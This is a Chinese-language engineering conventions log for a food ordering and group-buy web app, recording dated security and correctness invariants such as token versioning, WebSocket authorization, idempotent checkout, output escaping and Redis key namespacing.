- **`PUT /api/auth/update` 不接受改手機**。手機是登入與重設密碼的依據，必須經 Firebase 手機驗證，不可在沒有 OTP 的端點直接改。`UserService.registerUser` 已移除（無呼叫者，且會接受未驗證手機）。
- **取消揪團品項或整單時，取得列鎖後必須再用 `GroupRefundPolicy.memberMaySelfCancel`（團員）或 `wholeGroupCancellable`（整單）檢查狀態**。控制器在鎖外做的檢查無法保證當下的狀態。
- **`POST /api/orders/{orderId}/cancel` 走 `GroupOrderService.cancelAsInitiator`**（列鎖、退款、還原券，與 `cancel/v2` 相同）。`OrderService.cancelOrder` 已移除，它不退款、也不還原優惠券。
- **結帳通知所需的門市 id 與總額由 `GroupOrderService.getCheckoutNotifyInfo` 在交易內取得**，控制器不得拿 entity 出去再 `getStore()`。`paymentMethod` 不可為空，且只接受 `WALLET`／`CASH`／`CREDIT_CARD`（回 400；白名單為 `GroupOrderController.ALLOWED_PAYMENT_METHODS`，不可只留 `WALLET`／`CASH`，N-18 曾因此擋下當時團購頁的預設 `CREDIT_CARD`）。團購頁的儲值金（`STORE_CREDIT`）在送出前映射為 `WALLET`（見 N-15）；團購頁已隱藏「信用卡」、預設為現金，不再送出 `CREDIT_CARD`（見 N-22），後端仍接受它並視為門市付款。
- **使用者可控名稱的寫入規則在 `common/SafeText`**：自己送來的值用 `normalizeDisplayName`（不合規回 400）；第三方登入帶來的名稱用 `sanitizeDisplayName`（清理、截斷、不失敗）。
- **前端含 HTML 的模板字串中插入名稱類欄位，一律以頁面內的轉義函式包住**（自動規則注入的是 `escHtmlSafe`，既有頁面用 `esc`／`escapeHtml`）。**不要對已在來源處轉義的變數再轉義一次**，否則會顯示成 `&amp;`。
- **`onclick="…${值}…"` 的 JS 字串內不得插入名稱類資料**：HTML 轉義不能防止字串跳脫。改用 `data-*` 屬性，由事件函式讀取 `dataset`（見 `profile.html` 的 `editExtraAddressFromEl`）。
- **`permitAll` 一律指定 HTTP method**（`SecurityConfig`）。`/api/stores/auth/**` 只開放 POST，`/api/menu/**`、`/api/home/**`、`/api/location/**`、`/api/group-orders/join/**` 等只開放 GET；WebSocket 的 `/ws/**`、`/ws-cart/**` 例外，因為 SockJS 會用到多種方法。
- **WebSocket 的 SUBSCRIBE 依角色授權**（`StompAuthInterceptor.authorizeSubscribe`，規則本體在 `StompSubscribeRules`）：`/topic/order/{id}` 限顧客且須為參與者；`/topic/group/{token}` 限該揪團的成員（N12）；`/topic/store/{id}` 只允許該門市本人（角色為 `STORE` 且 id 相符）；其餘目的地一律拒絕。principal 必須帶 `role`，因為門市與顧客的 id 會撞號。CONNECT 與每次 SUBSCRIBE 都重新檢查帳號、權杖版本（N13）與 token 期限（N7）；客戶端 SEND 一律拒絕（N5）。
- **`docker-compose.yml` 的 MySQL 與 Redis 埠口只綁 `127.0.0.1`**；正式環境範本關閉 springdoc（`application-prod.yml.example`）。
- **分店回應不含店長手機（N6）**：`StoreService.toMap` 只回 `storePhone`；`phone` 鍵（店長手機）只由 `getProfile`（店家後台本人）加回。公開端點（`/api/stores/{id}/v2`、`/api/stores/brand/{id}`）共用 `toMap`，不得再放進去。
- **記錄檔不寫原始手機號碼（N17）**：`AuthService` 的記錄改用 `common/PhoneMask.mask()`（只留末三碼），並附上 `userId` 以便對應。`LogPhoneGuardTest` 掃描 `src/main/java` 內所有 `log.*(` 呼叫，之後新增的記錄若提到手機卻未遮罩，測試會紅。

## 2026-10-12 新增的不變量與約定

- **結帳冪等**：`POST /api/orders/checkout` 接受選擇性的 `Idempotency-Key` 標頭，由 `service/IdempotencyService` 處理（範圍為 `checkout` 加上 JWT 使用者 id；鍵須符合 `^[A-Za-z0-9_-]{8,64}$`）。成功的請求重送時會回放第一次的結果並帶 `Idempotent-Replayed: true`；進行中的重複請求回 409；非 2xx 會釋放鍵。**新增任何可能被重送的金流 POST，一律沿用這個 helper，不要另外發明儲存方式。** 請求內容以 JSON 指紋（SHA-256）比對：同一把鍵搭配不同內容回 422，不執行、不改動既有紀錄；舊版紀錄（無指紋）在過期前仍照舊重播（見 ADR-0005）。`execute` 的 `requestBody` 不可省略。
- **不信任 `X-Forwarded-For`**：限流與識別一律以 `getRemoteAddr()` 為準（`LoginAttemptLimiter.clientIp`）。`server.forward-headers-strategy`（環境變數 `SERVER_FORWARD_HEADERS_STRATEGY`，預設 `native`）決定容器是否信任反向代理送來的 `X-Forwarded-*`；部署到代理之後必須明確設定，並確認代理會覆寫這些標頭（見 `docs/DEPLOYMENT.md`、ADR-0004）。
- **新增 `permitAll` 路由，必須同步更新 `AuthorizationRouteInventoryTest`**：把路徑加入 `PUBLIC_GET` 或 `PUBLIC_POST`，讓公開例外在 review 中可見。其他非公開路由的匿名呼叫必須回 401／403，否則該測試會紅（見 ADR-0003）。
- **排程任務以 `ExclusiveJobRunner.runExclusively(jobName, leaseSeconds, job)` 包住**（Redis 鍵 `lock:job:<name>`），多實例時同一時間只會有一個實例執行。這是互斥，不是「每天只跑一次」，因此任務本身必須冪等（見 ADR-0006）。
- **業務錯誤用 `CustomException`，code 填 HTTP 狀態碼字串**（如 `"409"`、`"422"`、`"503"`、`"400"`）。`GlobalExceptionHandler` 會轉成對應的 HTTP 狀態；不要在 Controller 手寫錯誤 Map。結帳鎖忙碌時拋出 `CustomException("503", …)`（判斷見 `service/order/CheckoutFailure`），`OrderController` 原樣拋出，不吞成 400。
- **CORS 的預設值只存在 `application.yml`**（`app.cors.allowed-origins`，環境變數 `CORS_ALLOWED_ORIGINS`），本機額外來源寫在 `application-local.yml`。上方「CORS 白名單」一節必須與預設值一致。
- **Actuator 只開放 `health`，且 `show-details` 為 `never`**。不要為了除錯暴露更多端點；需要的資訊走 log，並以 `X-Request-Id` 串接。
- **`X-Request-Id`**：每個回應都帶此標頭。合規的傳入值會沿用（`^[A-Za-z0-9_-]{8,64}$`），否則產生新的 32 位十六進位 id；它同時被寫進每一行 log 的 MDC。
- **靜態頁面由後端的 `common/WebConfig` 以 `file:frontend/…` 提供**，Docker 映像的工作目錄因此必須有 `frontend/`（見 `Dockerfile`）。新增執行期需要的頂層目錄時，要同步更新 Dockerfile；`.dockerignore` 排除了 `docs/`、`scripts/`、`.github/`。

## 2026-10-15 新增的不變量與約定

- **權杖在改密碼與刪除帳號後失效（N13）**：權杖帶 `tokenVersion` 聲明（`JwtUtils.generateToken` 的四參數版本）。`AccountStatus.isActive` 比對資料庫目前的版本與角色，HTTP 與 STOMP（CONNECT、每次 SUBSCRIBE）共用這一條規則。
- **改密碼一律呼叫 `User.changePasswordHash()`**，它會換掉雜湊並遞增版本。`setPasswordHash` 只用於建立新帳號（註冊、新增分店）與示範資料。需要強制登出的路徑（如登出所有裝置，見 2026-10-22 節）呼叫 `revokeIssuedTokens()`。
- **改密碼 API 回傳新權杖**（`POST /api/users/{userId}/change-password` 回傳 `{ message, token }`）。前端必須換上（`profile.html` 已處理）；其他裝置上的舊權杖在下一次需要登入的請求即被拒絕。
- **品牌與門市目前沒有改密碼路徑**。停用路徑已於 2026-10-20 加入（見該節），停用時會遞增版本。日後新增改密碼路徑時，必須遞增版本，否則舊權杖不會失效。
- **沒有版本聲明的舊權杖視為版本 0**，欄位預設 0，部署時既有登入不會被強制登出。
- **部署前必須先手動加欄位**：`users`、`brands`、`stores` 新增 `token_version INT NOT NULL DEFAULT 0`。prod 為 `ddl-auto: validate`，欄位不存在時啟動會失敗（SQL 見 `DATABASE.md`「結構變更方式」）。
- **2026-10-15 時登出只在前端清除 token**；「登出所有裝置」已於 2026-10-22 實作（見該節，僅限顧客）。改密碼不切斷既有的 STOMP 訂閱，要等連線結束（與 N12 同一缺口）；新的 SUBSCRIBE 會被拒絕。
- **手機驗證權杖只能成功使用一次**（`FirebaseTokenReplayGuard`，見 ADR-0009）：`verifyFirebasePhone` 在號碼比對通過後呼叫 `claimOnce`，同一張在 2 小時內再用一律 401。`verifyOnly`（前端註冊頁的 `firebase-verify`）與 `MOCK_TOKEN` 都不記錄。Redis 鍵是 `fbtoken:<SHA-256>`，權杖本身不入庫。新增手機驗證端點時必須走 `verifyFirebasePhone`，不要另寫比對。
- **社群權杖不在此規則內**（已知缺口）：Google、Facebook 權杖在整合流程的多個步驟中重複使用。通過號碼比對之後的失敗（例如第三方與權杖不符）也會燒掉手機驗證權杖，使用者需要重新取得驗證碼；這是刻意的取捨。
- **Redis 故障期間只保證單一實例內正確**：`ClaimStore` 一律先寫本地，有 Redis 時再寫遠端；遠端拋例外時退回本地並寫警告。多實例之間不共享，與限流相同的退避策略。
- **手機驗證端點共用限流範圍 `auth-phone-proof`**（IP＋手機）：重設密碼、設定密碼、綁定、建立帳號共五條路由都必須呼叫 `loginAttemptLimiter.check`，由 `PhoneProofRateLimitGuardTest` 文字掃描守住。
- **JWT 只接受 HS512**：`common/JwtAlgorithm.isAllowed` 在 jjwt 解析前檢查 header，只接受 `{"alg":"HS512"}`（可加 `"typ":"JWT"`）。要放寬演算法，必須同時改 `JwtAlgorithmTest` 的負向案例並寫明理由。
- **前端登入權杖只讀 `JOIN_TOKEN`**：`userToken` 已無任何程式寫入。`cart.js` 曾同時讀兩者，殘留值會讓登出後的購物車仍視為已登入。
- **WebSocket 拒絕訊息**：權杖版本失效或帳號無法使用時回「登入已失效或帳號無法使用，請重新登入」。版本失效的帳號仍存在，因此不再沿用「帳號已停用或不存在」。
- **2026-10-15 新增測試的驗證狀態**：手機驗證權杖、JWT 白名單與 `ClaimStore` 的純邏輯測試已在本機還原驗證（README「2026-10-15 還原驗證」）。需要 Spring、Mockito 或 jjwt 的案例（`AuthServiceSecurityTest` 新增的 2 支、`JwtAlgorithmEnforcementTest`、`StompAuthInterceptorTest` 與 `JwtAuthenticationFilterTest` 的新案例）本機無法執行，已由 CI 確認（run 38836496498，`mvn test` 339 個測試全數通過）。

## 2026-10-17 新增的不變量與約定

- **結帳忙碌回 503**：`OrderService.createOrder` 的結帳鎖取不到時拋 `CustomException("503", …)`；`OrderController.placeCheckout` 只對 `CheckoutFailure.isBusy` 原樣拋出，其餘建單失敗仍回 400。不要把 503 再吞成 400。
- **冪等鍵必須綁定請求內容**：`IdempotencyService.execute` 的 `requestBody` 不可省略；佔位與完成紀錄都保存 SHA-256 指紋，同一把鍵配不同內容回 422。
- **UI 驗證的失敗由 `scripts/ui/report.js` 登記**：新增的檢查套件要呼叫 `report.fail(...)`，不要只 `console.log`。`run-all.js` 不再解析 console 輸出。
- **2026-10-17 新增測試的驗證狀態**：`OrderServiceCheckoutLockTest`、`OrderControllerCheckoutFailureTest`、`CheckoutFailureTest` 與 `IdempotencyServiceTest` 的新增案例已於 CI 還原驗證（README「2026-10-17 還原驗證（CI）」，M5、M6、M9、M10）；`GroupOrderServiceAuthorizationTest` 的 PricingService stub 改動見 M7、M8。

## 2026-10-18 新增的不變量與約定

- **店家搜尋分頁**：`GET /api/stores/search` 的 `page` 從 1 起算（0 或負數視為第一頁），`size` 預設 50、上限 200（`PublicService.SEARCH_MAX_PAGE_SIZE`）。回應為 `{ stores, page, size, total, totalPages, hasNext }`；`total` 一律來自 `StoreRepository.countSearchByKeyword`，不可用本頁筆數代替。
- **距離排序的分頁要在 SQL 內完成**：`searchByKeywordWithDistance` 以 `ORDER BY distance, s.id` 搭配 `LIMIT :size OFFSET :offset`。`s.id` 是同距離時的決定性排序鍵，少了它，翻頁時同距離的店家可能重複或漏掉。不可改為先撈全部、再在 Java 端切頁。
- **Haversine 的 `acos` 參數必須夾在 [-1, 1]**：兩點座標相同時，浮點誤差會讓參數略大於 1，MySQL 的 `ACOS` 回 NULL。SQL 以 `LEAST(1, GREATEST(-1, …))` 夾住；服務層對 NULL 距離也要能處理（`PublicServiceSearchTest.nullDistanceDoesNotFailTheSearch`）。
- **搜尋頁的競態以序號守住**：`search_result.html` 每次搜尋都遞增 `searchSeq`，回應回來時序號不符即丟棄；「展開更多」以 `loadingMore` 防止連點。新增類似的列表載入時請沿用這兩個守衛。
- **團購頁不提供「信用卡」（N-22）**：團長與團員的付款區不再有 `CREDIT_CARD` 選項，預設為現金。白名單與 `GroupRefundPolicy` 的語意不變，後端仍把 `CREDIT_CARD` 視為門市付款。`flow-group.js` 斷言兩處的預設值與選項數量。
- **UI 主線新增搜尋分頁**：`scripts/ui/flow-search.js` 以 `page.route` 攔截 `/api/stores/search`，驗證第一頁 12 筆、展開更多不重複、最後一頁後按鈕隱藏，以及先搜「甲」（回應延遲）、再搜「乙」時，延遲到達的「甲」不得覆蓋「乙」的結果。
- **2026-10-18 新增測試的驗證狀態**：`PublicServiceSearchTest`、`PageSizeClampTest` 的搜尋案例與 `flow-search.js` 已於 CI 還原驗證（README「2026-10-18 還原驗證（CI）」，M11–M13）；`flow-group.js` 的 N-22 斷言見 M14。
- **單人結帳頁的「信用卡支付」送出 `WALLET`（未處理）**：`frontend/Customer/checkout.html` 的這個選項與「儲值金支付」送出相同的值，後端依 `WALLET` 扣錢包餘額，與 UI 文字不符。需產品決定後再修正（見 README「已知技術債」）。
- **品牌審核（N-28）**：`brands.approval_status` 為 `PENDING` ／ `APPROVED` ／ `REJECTED`，判斷一律經 `common/BrandApproval`（fail-closed：只有完全等於 `APPROVED` 才算核准）。`BrandService.register` 必須設為 `PENDING`；`BrandService.login` 先驗密碼、再檢查審核狀態，待審或退件回 403。
- **既有權杖也受審核規則約束**：`AccountStatus` 的 BRAND 分支要求已核准且版本相符，HTTP 與 STOMP 共用。品牌被退件後，它手上的權杖立即失效。
- **公開列表只含已核准品牌**：`PublicService.getBrands()` 以 `findByApprovalStatus(APPROVED)` 過濾，`getBrandDetail` 對未核准的品牌回 404。新增任何對外列出品牌的查詢，必須同樣過濾。
- **審核必須是條件式更新**：`BrandRepository.transitionApprovalStatus` 寫成 `WHERE approval_status = :currentStatus`，回傳 0 列時再區分 404（不存在）與 409（已處理）。不可改為「讀出、檢查、寫回」，那會讓兩位管理員同時操作時後寫者覆蓋先寫者。
- **管理員（ADMIN）**：獨立的 `admins` 資料表，角色固定為 `ADMIN`，沒有公開註冊。`AdminBootstrap` 只在 `ADMIN_BOOTSTRAP_USERNAME` 與 `ADMIN_BOOTSTRAP_PASSWORD_HASH`（BCrypt，不接受明文）都設定、且帳號不存在時建立；已存在不覆寫密碼；格式錯誤則啟動失敗。管理員身分與顧客端相同，一律取自 token（`currentUserId`）。
- **`/api/admin/**` 的授權**：需要 `ADMIN` authority；唯一的 permitAll 是 `POST /api/admin/auth/login`，並經過 `LoginAttemptLimiter`（scope `admin-login`）。
- **管理員權杖只在 HTTP 有效**：`AccountStatus` 的六參數多載不傳管理員儲存庫，因此 STOMP 一律拒絕 ADMIN（`StompAuthInterceptorTest.adminTokenCannotConnect`）。若日後要讓管理員連 WebSocket，必須同時傳入管理員儲存庫並補上對應測試。
- **`brands.approval_status` 的 DDL 預設值是 `'APPROVED'`**：既有品牌因此維持可登入。正式環境的 ALTER 必須帶同一個預設值（見 `DATABASE.md`「結構變更方式」）。
- **管理員權杖的版本（N13）**：與其他帳號相同。目前沒有管理員改密碼或停用的路徑；日後新增時必須遞增 `token_version`。
- **N-28 測試的驗證狀態**：`AccountStatusTest.brandThatIsNotApprovedIsNotUsable`、`AccountStatusTest.adminIsUsableOnlyWhenAdminRepositoryIsSupplied`、`JwtAuthenticationFilterTest.rejectsBrandTokenWhilePendingReview`、`BrandServiceApprovalTest.registerCreatesAPendingBrand`、`AuthorizationTest.customerCannotReachTheAdminBackend`、`StompAuthInterceptorTest.adminTokenCannotConnect` 已於 CI 還原驗證（README「2026-10-18 還原驗證（N-28，CI）」，M-a 至 M-d）。`BrandApprovalTest`、`AdminServiceTest`、`AdminBootstrapTest` 與其餘 N-28 案例尚未被任何破壞覆蓋。
- **管理員審核頁面（`frontend/Admin/`，N-28 第四階段）**：權杖存在 `adminToken`，與顧客、品牌、門市的權杖分開；帶權杖的請求回 401／403 時清除權杖並回到登入頁。`SecurityConfig` 只放行 `GET /Admin/**`（靜態頁不含資料），資料一律經 `/api/admin/**`，仍需 ADMIN 權杖。
- **後台頁面的輸出端轉義**：清單的每個插入值都先過頁面內的 `escapeHtml`，動作以 `data-*` 與事件代理傳入，不把資料拼進 `onclick`。`flow-admin.js` 第七步以攔截的假資料驗證含標籤的品牌名稱不會被執行。
- **UI 的管理員帳密**：CI 以 `ADMIN_BOOTSTRAP_*` 建立 `ci-admin`，同一組帳密由 `E2E_ADMIN_*` 提供給 `harness.adminLogin()`。本機要跑 `page-sweep` 或 `flow-admin` 前，需以相同帳密啟動後端。
- **管理員審核流程的驗證狀態**：`flow-admin.js` 於 CI（commit `3ae0ca9`，run 39152447226）通過；四組破壞於本機還原驗證（README「2026-10-18 還原驗證（管理員審核 UI，本機）」）。

## 2026-10-19 新增的不變量與約定

- **待接單逾時拒單由伺服器排程執行（N-32）**：`OrderAutoRejectJob` 每 30 秒由 `ScheduledTasks` 觸發，經 `ExclusiveJobRunner`（`order-auto-reject`，120 秒租約）互斥，每輪最多 100 筆。`GroupOrderRepository.findExpiredPendingOrderIds` 只是粗篩；真正的判斷在 `AnalyticsService.autoRejectIfStillPending` 取得 `findByIdForUpdate` 列鎖之後，以 `AutoRejectPolicy.isExpired` 重判。**不可把前端的自動拒單加回來，也不可把整批掃描包進同一個交易**（一筆失敗會回滾其他已完成的退款）。
- **逾時規則只在 `AutoRejectPolicy`**：只適用 `SUBMITTED`（OPEN 的揪團仍在加點，不算待接單）；計時起點 `submittedAt`，缺值才退回 `createdAt`；嚴格超過 10 分鐘才逾時。推播 `/topic/order/{id}`（`REJECTED`）在該筆交易提交之後才送。
- **前端只顯示倒數**：`api-home.js`、`order-all-sync.js`、`api-orders.js`、`home-order-preview-sync.js` 只有 SUBMITTED 才有 deadline，錨點與伺服器一致（`submittedAt`，缺值退回 `createdAt`）。逾時只停用接單與拒單按鈕，不送拒單請求。首頁卡片的 SUBMITTED 對應 `pending`。
- **店家接單與拒單共用列鎖**（`AnalyticsService.getOrderForStoreForUpdate`）。PREPARING 以後拒單回 409，不產生退款（退款規則不允許接單後退款，見 `GroupRefundPolicy`）。
- **WAITING_SUBMIT 的款項只由 escrow 退一次**：`OrderService.createOrder` 與揪團結帳會把整筆金額併入 `escrowAmount`，整單取消時不可再逐品項退款（個人訂單原本一杯 $35 取消後退 $70）。揪團本來就是這樣處理，SOLO 與 GROUP 現在一致。
- **代墊金只有錢包付款才留**：`GroupRefundPolicy.escrowAfterCheckout` 與結帳的扣款條件完全相同（只認大寫 `WALLET`）。揪團以現金或信用卡結帳不留待退金額，否則取消時會把從未扣過的錢退進團長錢包。
- **整單取消時，所有品項的優惠券一律還原**，與付款狀態無關（`restoreUserCoupon` 只把 used 改回 unused，重複呼叫無害）。
- **索引**：`orders(status, submitted_at)`（`GroupOrder` 的 `@Index`）。prod 為 `validate`，不會建立索引，需人工執行 DDL（見 `DATABASE.md`「結構變更方式」）。
- **新增排程任務**：必須經 `ExclusiveJobRunner`，任務本身必須冪等（見 ADR-0006、ADR-0011）。
- **2026-10-19 新增測試的還原驗證**：`AutoRejectPolicyTest`、`GroupEscrowRuleTest`、`AnalyticsServiceAutoRejectTest`、`GroupOrderServiceCancelRefundTest`、`OrderAutoRejectJobTest`、`ScheduledTasksAutoRejectTest` 的破壞結果記在 README「2026-10-19 還原驗證（CI）」。

## 2026-10-20 新增的不變量與約定

- **品牌與門市可由管理員停用（stage 6，ADR-0012）**：`AdminService.suspendBrand` 與 `suspendStore` 停用時遞增 `token_version`（品牌連同底下所有分店），既有權杖由 `AccountStatus` 的版本比對擋下。`reinstate` 不遞增，停用前的權杖恢復後仍無效，須重新登入。停用與恢復一律是條件式更新（`WHERE suspended = …`），0 列時再以一次讀取區分 404 與 409，不可改為「讀出、檢查、寫回」。
- **列出分店的查詢只能套用 `StoreVisibility.FILTER`**：`StoreRepository` 中每一條公開列出分店的 `@Query`（含計數查詢）都必須帶 `s.status = 'active' AND s.suspended = FALSE AND b.suspended = FALSE`，由 `StoreVisibilityGuardTest` 以反射掃描守住。單一分店的判斷用 `StoreVisibility.isReachable(...)`，不要在 Service 內再寫一份條件。
- **下單與付款檢查停用，取消與退款不檢查**：個人結帳（`OrderService.repriceItems`）、揪團的商品驗證（`GroupOrderService.validateActiveStore`）、團員付款與補款會拒絕（400）。取消與退款刻意不檢查，已付款的訂單必須仍能結清。
- **公開讀取一律過濾**：`PublicService`、`MenuService`、`ProductService`（商品清單、詳情、規格、客製化）與 `DailySpinService`（轉盤分類與抽獎）對停用的分店或品牌回空或 404。新增公開讀取端點時，同步加入 `SuspensionPublicReadsTest` 或 `SuspensionVisibilityServiceTest` 的案例。
- **既有 WebSocket 連線在交易提交後切斷**：`AdminService` 在交易內發布 `AccountsSuspendedEvent`，`AccountSuspensionCutListener` 以 `AFTER_COMMIT` 處理，交易回滾就不切。切斷以 `StompSessionRegistry` 標記，`CutSessionOutboundInterceptor` 丟棄送往這些工作階段的訊息。`StompSessionListener` 在 CONNECT 後再檢查一次，停用早於登錄者立即切斷。登錄表只在單一實例內（見 ADR-0012 的代價）。
- **管理員頁面**：`/Admin/managed.html`（已核准品牌）與 `/Admin/stores.html?brandId=`（分店）。停用需要確認（`window.confirm`），恢復不需要；提示說明須重新登入。`stores.html` 的品牌 id 只接受正整數，缺少或不合法時不呼叫 API。
- **2026-10-20 新增測試的驗證狀態**：Java 測試已在 CI 上通過（`ea1531d`，[run 39535734153](https://github.com/Leo0049/projectLab_2/actions/runs/39535734153)，460 個測試、84 個類別，失敗 0）。第一次 CI（run 39535423592）有三個測試錯誤，已於同一 PR 修正。本機無法執行 Maven。Java 端的還原驗證已於 CI 完成：十組破壞（scratch 分支 `main-verif-stage6-A` 至 `-K`）中，六組被具名測試抓到，G、I、J、K 四組當時沒有任何測試轉紅，列為測試缺口；2026-10-21 已補測試並重跑（見 README「2026-10-21 補測試後還原驗證（Java，CI）」）。前端部分以 Chromium 對假的管理員 API 跑 39 項檢查，並做六組還原驗證，結果見 README「2026-10-20 還原驗證（本機）」。`flow-admin.js` 的「停用與恢復」步驟已在 CI 的 UI 流程中執行並通過。
- **付款守衛與切斷階段的測試（2026-10-21 補上）**：停用期間的個人結帳（`OrderService.repriceItems`、`placeOrder`）、團員付款與補款（`GroupOrderService.getMemberUnpaidTotalAndMarkPaid`、`repayToHost`）、揪團建立時的分店驗證（`validateActiveStore`，經 `createGroupOrderV2`），由 `StoreSuspensionPaymentGuardTest` 斷言回 400；`AccountSuspensionCutListener` 的 `AFTER_COMMIT` 階段由 `AccountSuspensionCutListenerTest` 以反射固定。交易回滾不切斷沒有整合測試，語意依賴 Spring。改動這些地方時，請在修補前後各跑一次還原驗證，並確認對應測試轉紅。

## 2026-10-22 新增的不變量與約定

- **購物車 Redis 鍵保留 30 天（stage 7）**：`cart:items:<token>` 與 `carts:active` 在每次寫入（`saveItem`、`removeItem`）時刷新為 `RedisCartService.RETENTION`（30 天，從最後一次更新起算）；`carts:active` 寫入時修剪超過保留期的成員。寫入一律經 `touchCart`，不要直接對這兩把鍵呼叫 Redis。這些鍵沒有讀取端，過期不影響功能；日後若要讀回購物車，必須接受快照可能已過期，缺值時以資料庫為準。三個新案例的還原驗證見 README「2026-10-22 購物車保留期還原驗證（CI）」。

## 2026-10-22（stage 8）新增的不變量與約定

- **登出所有裝置只限顧客（stage 8）**：`POST /api/users/{userId}/logout-all` 先以 `requireSelf` 確認是本人，再呼叫 `UserService.logoutAllDevices`：`findByIdForUpdate` 列鎖 → `User.revokeIssuedTokens()`（版本 +1）→ 發布 `AccountsRevokedEvent`。既有權杖（含目前這個瀏覽器）立即失效（N13）。品牌與門市沒有此端點；日後新增時，必須同樣遞增 `token_version` 並發布事件。
- **撤銷與停用的切斷分開命名**：`AccountsRevokedEvent`（登出所有裝置）由 `TokenRevocationCutListener` 處理；`AccountsSuspendedEvent`（停用）仍由 `AccountSuspensionCutListener` 處理。兩者都以 `AFTER_COMMIT` 呼叫 `StompSessionRegistry.cut`，交易回滾就不切斷。
- **切斷只作用於處理請求的實例**：`StompSessionRegistry` 只存在單一實例的記憶體中（與 ADR-0012 的代價相同）。權杖失效是全域的（版本存在資料庫），但其他實例上既有的 STOMP 連線要等到連線結束；新的 CONNECT 與 SUBSCRIBE 一律被拒絕。
- **前端只在伺服器回應成功後才清除本機登入**：`profile.html` 的「登出所有裝置」請求失敗時保留登入狀態並顯示錯誤，不做只清本機的假登出。
- **已知缺口**：從交易提交到切斷的整段流程沒有整合測試，`AFTER_COMMIT` 的「回滾不切斷」語意依賴 Spring（與 stage 6 相同）。切斷只作用於處理請求的實例（ADR-0012）。
- **還原驗證**：`UserServiceLogoutAllTest`、`TokenRevocationCutListenerTest` 與 `AuthorizationTest` 的兩個新案例，結果見 README「2026-10-22 登出所有裝置還原驗證（CI）」。

## 2026-10-22（stage 9）新增的不變量與約定

- **團長結帳也接受 `Idempotency-Key`**：`POST /api/group-orders/{token}/checkout`（`GroupOrderController.checkout`）經 `IdempotencyService.execute` 包住，範圍為 `group-checkout:<token>` 加上使用者 id（見 ADR-0005 的 2026-10-22 追加）。同一把鍵用在另一團不會互相影響。新增可能被重送的金流 POST 時沿用同一個 helper，並讓範圍包含所有會改變請求意圖的識別（團的 token、訂單 id）。
- **提交之後的失敗不得回 400**：`GroupOrderService.checkout` 回傳即代表已提交。之後讀取通知資訊與推播失敗只記 log，回應仍為成功，否則前端會當成失敗而重送。`placeHostCheckout` 的第一個 try 只包住送單本身；日後在提交後新增步驟，照同樣處理。
- **提交後才組裝的回應不用 `Map.of`**：`Map.of` 不接受 null 值，而團長結帳的 `totalAmount` 在讀取失敗時為 null，因此改用 `LinkedHashMap`。
- **冪等指紋的輸入要有固定順序**：`Map.of` 的迭代順序每次 JVM 啟動都可能不同。目前的指紋是 `CheckoutRequest` 的 Jackson 序列化（欄位順序固定）；若改以 Map 作為指紋輸入，必須改用 `LinkedHashMap` 或 `TreeMap`，否則重啟後的重送會變成 422。
- **`CheckoutRequest` 為 package-private**：僅供控制器與 `GroupOrderCheckoutIdempotencyTest` 使用。
- **團員付款（`member-checkout`）尚未接受 `Idempotency-Key`**：重複扣款仍由列鎖與狀態守衛防止，但重送不會回放第一次的結果。下一個 PR 沿用同一個 helper 即可。
- **還原驗證**：見 README「2026-10-22 群組結帳冪等還原驗證（CI）」。

## 2026-10-22（stage 10）新增的不變量與約定

- **Redis 的鍵一律經命名空間序列化器**（ADR-0013）：主要的 `StringRedisTemplate`（`@Primary`）與通用 `RedisTemplate` 的鍵序列化器會加上 `REDIS_KEY_NAMESPACE:` 前綴。新增 Redis 鍵時注入這兩個模板即可，不要自己拼前綴，也不要用 `RedisConnection` 直接寫鍵。
- **只有鍵加前綴**：hash 欄位與 zset 成員是資料（購物車的品項 id、token），不要改動它們的序列化器。
- **`fbtoken:` 刻意不加前綴**：一律經 `globalStringRedisTemplate`（`RedisConfig.GLOBAL_STRING_TEMPLATE`）。改用主要模板會讓同一張手機驗證權杖在另一個環境再被接受一次。日後若有其他需要跨環境共用的鍵，同樣使用全域模板，並追加到 ADR-0013。
- **prod 必須設定 `REDIS_KEY_NAMESPACE`**：未設定時應用程式拒絕啟動（`RedisKeyNamespace.resolveForProfile`）。格式不合規（小寫英文開頭、小寫英數與連字號、最長 32 字元、不含冒號）時，不論 profile 都拒絕啟動。
- **命名空間不是隔離**：記憶體上限、淘汰策略與故障範圍仍是共用的。獨立實例仍是建議做法。
- **首次啟用會讓既有的 Redis 鍵失效**：這是預期行為，影響見 ADR-0013 與 `docs/DEPLOYMENT.md`。
- **還原驗證**：見 README「2026-10-22 Redis 鍵命名空間還原驗證（CI）」。

## 2026-10-23（stage 11）新增的不變量與約定

- **事件屬性不插入值（N-14）**：`onclick`、`onerror` 等 inline 事件屬性的值是 JavaScript 字串，HTML 轉義擋不住字串跳脫。使用者可控或伺服器產生的值一律放進 `data-*`，由事件函式以 `this.dataset` 讀取，例如 `<button data-id="${esc(id)}" onclick="removeItem(this.dataset.id)">`。
- **`dataset` 只回字串**：要傳數字的參數，在呼叫端寫 `Number(this.dataset.x)`（例如 `setDefaultCard(Number(this.dataset.id))`）。函式內若用嚴格比對（`c.id === id`）或拿去加減，字串會靜默出錯（`"2" + 1` 得 `"21"`）。
- **守門兩層**：`InlineHandlerInterpolationGuardTest` 以文字掃描守住寫入端（`frontend/` 下的 `.html`、`.js`，排除 `vendor/`；同一個屬性值內出現 `${` 即違規）。`scripts/ui/flow-inline-controls.js`（`run-all.js` 的「內嵌事件控制項流程」）守住行為：逐一點下改過的控制項，檢查送出的參數型別、DOM、網址與購物車狀態。
- **流程的選擇器不依賴轉換後的參數文字**：只用函式名稱與固定的參數字面值（`, 1)`、`, -1)`）定位控制項。否則破壞參數會變成「找不到控制項」，而不是行為檢查失敗。
- **選擇器要限定在該列之內**：導覽列的購物車下拉也有一顆 `removeItem` 按鈕，帶著 `data-index`（N-14 之前沒有），而且在 DOM 中排在前面、平時隱藏。沒限定範圍時 `.first()` 會抓到它，點擊逾時（2026-10-23 實際發生）。流程一律先用 `[class~="group/item"]` 定位第 n 列，再在列內找按鈕。
- **移除類的檢查要比對剩下的品項名稱**：只數筆數抓不到「移到錯的品項」，例如索引被破壞後移除了第 1 項。
- **非同步的 UI 狀態要等，不能讀一次**：前端在回應回來之後才改樣式（例如收藏的愛心），斷言要用 `until`。否定式檢查（「不該導覽」）要先等一小段時間，讓不該發生的事有機會發生。慢的 CI 會放大這種競態（2026-10-23 的 run 40078222826）。
- **導覽前等請求靜止**：流程的頁面跳轉一律經 `visit()`（內含 `settle()`）。頁面還有 fetch 時離開，Chromium 會記成「Failed to fetch」，那是測試時機造成的假陽性，不是專案的錯。
